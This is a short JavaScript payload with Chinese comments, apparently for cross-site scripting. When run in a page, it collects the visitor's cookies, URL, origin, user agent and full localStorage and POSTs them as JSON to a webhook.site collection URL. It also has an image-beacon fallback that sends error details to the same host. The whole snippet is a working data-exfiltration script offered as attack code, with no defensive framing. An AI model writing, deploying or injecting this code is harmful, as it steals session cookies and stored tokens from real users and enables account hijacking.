// 完整版包含錯誤處理和更多信息收集
(async function() {
  try {
    const data = {
      cookies: document.cookie,
      origin: location.origin,
      url: location.href,
      userAgent: navigator.userAgent,
      localStorage: JSON.stringify(localStorage),
      timestamp: new Date().toISOString()
    };
    
    await fetch('https://webhook.site/51ab4e6d-5c63-44e7-9aaa-fae89d54be97', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (e) {
    // 備用方案：使用圖片載入發送基本信息
    new Image().src = `https://webhook.site/51ab4e6d-5c63-44e7-9aaa-fae89d54be97?error=${encodeURIComponent(e.message)}`;
  }
})();